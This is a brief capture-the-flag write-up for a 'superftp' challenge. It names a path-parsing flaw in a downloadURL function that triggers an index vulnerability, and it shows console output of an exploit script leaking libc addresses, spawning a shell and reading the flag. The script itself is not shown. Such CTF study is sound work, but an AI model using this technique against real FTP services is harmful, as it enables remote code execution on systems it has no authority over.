# supterftp
**write-up**
- Parse "/../" and '/' in downloadURL function.
- Index vulnerability is triggerd by parsed index.

```
asiagaming superftp-> python solve.py
[+] Starting local process './ftp': pid 29612
[*] Stopped process './ftp' (pid 29612)
[+] Starting local process './ftp': pid 29614
[*] Stopped process './ftp' (pid 29614)
[+] Starting local process './ftp': pid 29616
[*] Stopped process './ftp' (pid 29616)
[+] Starting local process './ftp': pid 29618
[*] Stopped process './ftp' (pid 29618)
[+] Starting local process './ftp': pid 29620
[*] Stopped process './ftp' (pid 29620)
[+] Starting local process './ftp': pid 29622
[*] Stopped process './ftp' (pid 29622)
[+] Starting local process './ftp': pid 29624
[*] Stopped process './ftp' (pid 29624)
[+] Starting local process './ftp': pid 29626
[*] libc_base : 0xf73bc000
[*] system : 0xf73f6da0
[*] Switching to interactive mode

$ ls
flag  ftp  ftp.idb  solve.py  superftp.py
$ cat flag
Sorry_ftp_1s_brok3n_T_T@
$
```
